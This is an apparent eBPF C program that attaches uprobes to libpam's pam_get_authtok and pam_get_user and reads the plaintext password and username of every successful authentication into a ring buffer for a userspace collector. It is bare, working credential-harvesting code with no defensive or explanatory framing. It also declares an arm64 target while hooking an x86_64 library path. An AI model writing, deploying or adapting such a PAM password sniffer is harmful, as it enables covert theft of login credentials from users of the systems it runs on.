#define __TARGET_ARCH_arm64
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define MAX_PW_LEN 128
#define MAX_USER_LEN 64

char LICENSE[] SEC("license") = "GPL";

struct event {
	int pid;
	char comm[16];
	char password[MAX_PW_LEN];
	char username[MAX_USER_LEN];
};

struct event dummy = {0};

// Buffer to communicate with userspace
struct {
	__uint(type, BPF_MAP_TYPE_RINGBUF);
	__uint(max_entries, 4096);
} events SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, __u32);
	__type(value, __u64);
} authtok_ptrs SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, __u32);
	__type(value, __u64);
} user_ptrs SEC(".maps");

SEC("uprobe//lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok")
int BPF_UPROBE(pam_get_authtok_enter, 
		void *pamh,
		int item,
		const char **authtok,
		const char *prompt) {
	pid_t pid = bpf_get_current_pid_tgid() >> 32;
	__u64 atok_ptr = (unsigned long)authtok;
	bpf_map_update_elem(&authtok_ptrs, &pid, &atok_ptr, BPF_ANY);
	return 0;
}

SEC("uretprobe//lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok")
int BPF_URETPROBE(pam_get_authtok_exit)
{
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    int ret = PT_REGS_RC(ctx);

    __u64 *stored = bpf_map_lookup_elem(&authtok_ptrs, &pid);
    if (!stored)
        return 0;
    bpf_map_delete_elem(&authtok_ptrs, &pid);
    if (ret != 0)
        return 0;

    __u64 atok_addr = 0;
    bpf_probe_read_user(&atok_addr, sizeof(atok_addr), (const void *)(*stored));
    if (!atok_addr)
        return 0;

    struct event *evt = bpf_ringbuf_reserve(&events, sizeof(struct event), 0);
    if (!evt)
        return 0;
    evt->pid = pid;
    bpf_get_current_comm(&evt->comm, sizeof(evt->comm));
    bpf_probe_read_user(evt->password, sizeof(evt->password), (const void *)atok_addr);
    bpf_ringbuf_submit(evt, 0);
    return 0;
}

SEC("uprobe//lib/x86_64-linux-gnu/libpam.so.0:pam_get_user")
int BPF_UPROBE(pam_get_user_enter,
               void *pamh,
               const char **user,
               const char *prompt)
{
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    __u64 user_ptr = (unsigned long)user;
    bpf_map_update_elem(&user_ptrs, &pid, &user_ptr, BPF_ANY);
    return 0;
}

SEC("uretprobe//lib/x86_64-linux-gnu/libpam.so.0:pam_get_user")
int BPF_URETPROBE(pam_get_user_exit)
{
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    int ret = PT_REGS_RC(ctx);

    __u64 *stored = bpf_map_lookup_elem(&user_ptrs, &pid);
    if (!stored)
        return 0;
    bpf_map_delete_elem(&user_ptrs, &pid);
    if (ret != 0)
        return 0;

    __u64 user_addr = 0;
    bpf_probe_read_user(&user_addr, sizeof(user_addr), (const void *)(*stored));
    if (!user_addr)
        return 0;
        
    struct event *evt = bpf_ringbuf_reserve(&events, sizeof(struct event), 0);
    if (!evt)
        return 0;
    evt->pid = pid;
    bpf_get_current_comm(&evt->comm, sizeof(evt->comm));
    bpf_probe_read_user(evt->username, sizeof(evt->username), (const void *)user_addr);
    bpf_ringbuf_submit(evt, 0);
    return 0;
}
